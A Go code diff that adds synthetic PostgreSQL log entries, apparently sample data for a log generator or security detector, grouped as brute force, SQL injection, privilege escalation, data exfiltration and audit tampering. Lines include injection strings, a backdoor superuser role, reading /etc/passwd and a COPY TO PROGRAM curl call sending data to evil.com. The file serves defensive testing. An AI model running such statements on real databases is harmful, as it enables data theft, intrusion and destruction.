@@ -112,6 +112,7 @@ var (
 		severity string
 		message  string
 	}{
+		// Normal operations
 		{severityLog, "statement: SELECT * FROM users WHERE id = $1"},
 		{severityLog, "statement: INSERT INTO orders (user_id, total) VALUES ($1, $2)"},
 		{severityLog, "statement: UPDATE products SET stock = stock - $1 WHERE id = $2"},
@@ -147,6 +148,62 @@ var (
 		{severityInfo, "autovacuum launcher shutting down"},
 		{severityDebug, "checkpoint record is at 0/12345678"},
 		{severityDebug, "redo record is at 0/12345678; undo record is at 0/0; shutdown TRUE"},
+
+		// Security: Authentication failures (brute force patterns)
+		{severityFatal, "password authentication failed for user \"admin\""},
+		{severityFatal, "password authentication failed for user \"root\""},
+		{severityFatal, "password authentication failed for user \"postgres\""},
+		{severityFatal, "password authentication failed for user \"sa\""},
+		{severityFatal, "no pg_hba.conf entry for host \"10.0.0.50\", user \"admin\", database \"production\""},
+		{severityFatal, "too many connections for role \"app_user\""},
+		{severityWarning, "connection rejected: too many connections for database \"production\""},
+		{severityError, "authentication failed for user \"backup_admin\": invalid credentials"},
+
+		// Security: SQL injection attempts
+		{severityError, "syntax error at or near \"'\" at character 42"},
+		{severityLog, "statement: SELECT * FROM users WHERE username = '' OR '1'='1'"},
+		{severityLog, "statement: SELECT * FROM users WHERE id = 1; DROP TABLE users;--"},
+		{severityLog, "statement: SELECT * FROM accounts WHERE id = 1 UNION SELECT password FROM credentials"},
+		{severityLog, "statement: SELECT * FROM products WHERE name = ''; WAITFOR DELAY '00:00:10'--"},
+		{severityLog, "statement: SELECT password FROM users WHERE username = 'admin'--"},
+		{severityLog, "statement: INSERT INTO users VALUES (1, 'hacker', (SELECT password FROM users WHERE username='admin'))"},
+		{severityWarning, "statement execution time exceeded threshold: 30000 ms"},
+
+		// Security: Privilege escalation attempts
+		{severityError, "permission denied to create role"},
+		{severityError, "must be superuser to alter superuser roles or change superuser attribute"},
+		{severityLog, "statement: ALTER ROLE app_user WITH SUPERUSER"},
+		{severityLog, "statement: ALTER ROLE readonly_user WITH CREATEROLE CREATEDB"},
+		{severityLog, "statement: GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO attacker"},
+		{severityLog, "statement: CREATE ROLE backdoor_admin WITH SUPERUSER LOGIN PASSWORD 'hacked123'"},
+		{severityError, "permission denied for schema pg_catalog"},
+		{severityFatal, "role \"app_user\" is not permitted to log in"},
+
+		// Security: Data exfiltration patterns
+		{severityLog, "statement: COPY (SELECT * FROM customers) TO '/tmp/customers_dump.csv'"},
+		{severityLog, "statement: COPY users TO PROGRAM 'curl -X POST -d @- http://evil.com/exfil'"},
+		{severityLog, "statement: SELECT * FROM credit_cards"},
+		{severityLog, "statement: SELECT ssn, dob, full_name FROM pii_data"},
+		{severityLog, "statement: pg_dump --table=passwords --data-only production"},
+		{severityWarning, "large data transfer detected: 50000 rows returned"},
+		{severityLog, "statement: SELECT pg_read_file('/etc/passwd')"},
+		{severityLog, "statement: SELECT lo_export(12345, '/tmp/secret.txt')"},
+
+		// Security: Suspicious administrative actions
+		{severityLog, "statement: DROP DATABASE production"},
+		{severityLog, "statement: TRUNCATE TABLE audit_logs"},
+		{severityLog, "statement: DELETE FROM security_events WHERE created_at < NOW()"},
+		{severityLog, "statement: ALTER TABLE audit_logs DISABLE TRIGGER ALL"},
+		{severityWarning, "parameter \"log_statement\" changed to \"none\""},
+		{severityWarning, "parameter \"log_connections\" changed to \"off\""},
+		{severityLog, "statement: UPDATE pg_authid SET rolpassword = 'md5' || md5('newpass' || 'postgres')"},
+
+		// Security: Anomalous access patterns
+		{severityWarning, "connection from unusual IP range: 185.220.101.0/24 (known Tor exit node)"},
+		{severityWarning, "off-hours database access detected from user \"admin\" at 03:24:15 UTC"},
+		{severityLog, "connection received: host=192.168.1.100 port=54321 (outside normal subnet)"},
+		{severityError, "SSL connection required but client connected without SSL"},
+		{severityWarning, "multiple databases accessed in single session: production, staging, backup"},
 	}
 )
 
